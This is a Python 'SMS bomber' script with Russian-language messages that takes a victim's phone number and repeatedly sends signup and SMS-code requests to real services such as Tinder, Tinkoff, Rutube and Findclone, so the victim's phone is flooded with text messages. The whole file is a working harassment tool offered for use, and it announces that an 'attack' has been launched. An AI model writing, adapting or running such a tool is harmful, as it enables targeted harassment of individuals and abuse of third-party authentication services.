#!/usr/bin/python
class spymer:
	def main(self):
		import requests, random, datetime, sys, time, argparse
		from colorama import Fore, Back, Style
		print("CyberLand SMS Bomber version.1.4")
		parser = argparse.ArgumentParser(prog='spymer', description="Возможно что-то уже не работает. Только для России!")
		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79991234455)')
		args = parser.parse_args()
		def showstatus(message, type='new'):
			now = datetime.datetime.now().strftime('%H:%M:%S')
			icon = '*'
			if type == 'warn':
				icon = '!'
			else:
				if type == 'new':
					icon == '*'
			message = '[' + icon + '][' + now + ']' + message
			return message
		def wrapsbrace(string, endspace=False):
			if endspace == True:
				return '[' + string + '] '
			return '[' + string + ']'
		def sleep(x):
			try:
				time.sleep(x)
			except KeyboardInterrupt:
				print('\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn'))
				exit()
		_phone = args.phonenum
		if _phone[0] == '+':
			_phone = _phone[1:]
		if _phone[0] == '8':
			_phone = '7'+_phone[1:]
		if _phone[0] == '9':
			_phone = '7'+_phone
		
		_name = ''
		for x in range(12):
			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		iteration = 0			
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
		print(showstatus(wrapsbrace('info', True) + ('Отправка SMS на: +{}').format(_phone)))
		print('Атака запущена. \nЕсли Вы хотите остановить - нажмите Ctrl+Z.')
		i = 1
		iteration = 0
		while i < 100:
			_email = _name+f'{iteration}'+'@gmail.com'
			tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
			rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
			findclone = requests.get(' https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
			#raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
			iteration += 1
			print(('{} круг пройден.').format(iteration))

spammer = spymer()
spammer.main()